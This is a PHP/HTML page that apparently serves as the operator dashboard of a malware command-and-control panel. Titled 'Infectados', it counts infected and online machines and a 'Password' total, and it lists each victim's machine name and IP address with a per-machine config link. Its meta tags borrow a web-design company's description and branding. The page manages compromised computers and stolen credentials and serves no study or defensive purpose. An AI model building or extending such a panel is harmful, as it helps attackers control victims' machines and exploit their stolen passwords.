<?php 
$int = 2;
if ($int == 0) {
	$flow = "./";
}elseif ($int == 1) {
	$flow = "../";
}elseif ($int == 2) {
	$flow = "../../";
}elseif ($int == 3) {
	$flow = "../../../";
}elseif ($int == 4) {
	$flow = "../../../../";
}elseif ($int == 5) {
	$flow = "../../../../../";
}elseif ($int == 6) {
	$flow = "../../../../../../";
}
?>

<!DOCTYPE html>
<html>

<!--HEAD COMPLETO-->
<head>
	<title>Infectados</title>
	<meta name="language" content="pt-BR">
	<meta name="description" content="Bem-vindo ao site da nossa empresa de criação de sites! Somos especializados em oferecer soluções web personalizadas e de alta qualidade para atender às necessidades específicas de cada um de nossos clientes.">
	
	<meta name="robots" content="all">
	<meta name="author" content="M0rx">

	<meta name="keywords" content="Stack, StackStore, Comprar site, preciso de um site, criador de site, programador">

	<link rel="canonical" href="https://stackstore.com.br"/>
	<meta property="og:type" content="website">
	<meta property="og:image" content="https://stackstore.com.br/assents/img/logo/NewLogo7.png">

	<meta property="twitter:card" content="summary_large_image">
	<meta property="twitter:image" content="https://stackstore.com.br/assents/img/logo/NewLogo7.png">

	<?php include($flow.'assents/app/head.php');?>
</head>
<?php include($flow.'assents/app/check.php');?>

<!--Importando Css-->
<?php include($flow.'assents/css/style_global.php'); ?>

<body>

<!--Ativar/Desligar Load-->
<?php #include($flow.'assents/app/load.php'); ?>

<!--Ativar Navbar Editar-->
<?php include($flow.'assents/app/navbar.php'); ?>

<!-- Body -->

<div class="dashboard">
	<div class="container">
		<div class="dashboard-widgets">
			<div class="row">
				<div class="col-md-4">
					<div class="card card-widgets">
						<div class="card-body">
							<div class="icon-widgets">
								Infectados
							</div>
							<div class="text-widgets">
								<?php echo $in ?>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-4">
					<div class="card card-widgets">
						<div class="card-body">
							<div class="icon-widgets">
								Online
							</div>
							<div class="text-widgets">
								<?php echo $in ?>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-4">
					<div class="card card-widgets">
						<div class="card-body">
							<div class="icon-widgets">
								Password
							</div>
							<div class="text-widgets">
								<?php echo $pw ?>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="dashboard-table">
			<table id="table-infectados" class="table table-borderless table-dashboard">
			    <thead>
			      <tr>
			        <th>Geo</th>
			        <th>Machine</th>
			        <th>Ip</th>
			        <th>Status</th>
			        <th>Config</th>
			      </tr>
			    </thead>
			    <tbody>
			      <?php while ($InfectInfo = $consult_infect->fetch_array()) {?>
			      	<tr>
			        <td><img width="30px" src="<?php echo $flow ?>assents/img/flags/global.png"></td>
			        <td><?php echo $InfectInfo['Machine']; ?></td>
			        <td><?php echo $InfectInfo['MachineIpv4']; ?></td>
			        <td><span class="badge background-success">Online</span></td>
			        <td><a href="<?php echo $flow ?>dashboard/infectados/config/?hash=<?php echo $InfectInfo['MachineHash']; ?>" class="btn btn-config"><i class="fi fi-rr-eye"></i></a></td>
			      </tr>
			      <?php } ?>
			    </tbody>
			</table>
		</div>
	</div>
</div>



<!-- Finalizar/Body -->

<!--Ativar Footer Editar-->
<?php #include($flow.'assents/app/footer.php'); ?>

<!--Import Cookie Enable-->
<?php include($flow.'assents/app/cookie.php'); ?>


<script type="text/javascript">
	$(document).ready( function () {
	    $('#table-infectados').DataTable({
	    	responsive: true,
	    	paging: false,
	    	select: true
	    });
	} );
</script>
</body>
</html>